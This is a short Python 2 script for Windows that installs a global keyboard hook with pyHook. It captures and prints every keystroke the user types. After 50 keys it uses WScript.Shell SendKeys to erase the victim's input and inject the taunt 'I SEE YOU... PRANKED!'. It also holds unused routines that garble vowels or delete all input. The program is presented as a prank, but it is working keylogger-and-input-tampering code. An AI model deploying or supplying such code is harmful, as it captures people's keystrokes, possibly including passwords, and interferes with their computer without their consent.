
# Include Modules
import pyHook, pythoncom, sys, logging
import random
import string
from time import sleep
import win32com.client

# Access Windows Script Shell
shell = win32com.client.Dispatch("WScript.Shell")

# Initial Declarations / Global Variables
i = 0
b = 0

# Keystroke gathering
# Gather and send to function
def OnKeyboardEvent(event):
	global i
	logging.basicConfig(level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	print chr(event.Ascii)
	processControl(chr(event.Ascii))
	#processDisable(chr(event.Ascii))
	return True

# Input distortion
def processDistort(inp):
	print inp
	gen = random.choice(string.letters)
	if inp=="a":
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(gen)
	elif inp=="e":
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(gen)
	elif inp=="i":
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(gen)
	elif inp=="o":
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(gen)
	elif inp=="u":
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(gen)

# Keyboard Control - Control Key output no matter input
def processControl(inp):
	global i
	global b

	arr = [' ','I',' ','S','E','E',' ','Y','O','U','.','.','.',' ','P','R','A','N','K','E','D','!',' ']
	
	# Increment (how many keystrokes)
	print "[ %s : %s ]" % (inp, i)
	i = i + 1

	# When 50 keystrokes sent...
	# Revert index back to 0 for array cycle... (Counter variable to array index)
	# And declare init bool to True
	if i > 50 and b==0:
		i = 0
		b = 1

	# When 50 keystrokes sent + init bool = true then...
	if(i < len(arr) and b==1):
		hooks_manager.UnhookKeyboard()
		shell.SendKeys("{BACKSPACE}")
		shell.SendKeys(arr[i])
		hooks_manager.HookKeyboard()
	# After all keys sent, then reset 
	# all variables back to 0, then..
	# Start over (Repeat ALL)
	elif(i > len(arr) and b==1):
		i=0
		b=0

# Disable Key Input
def processDisable(inp):
	print inp
	shell.SendKeys("{BACKSPACE}")


# Hook Keyboard
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()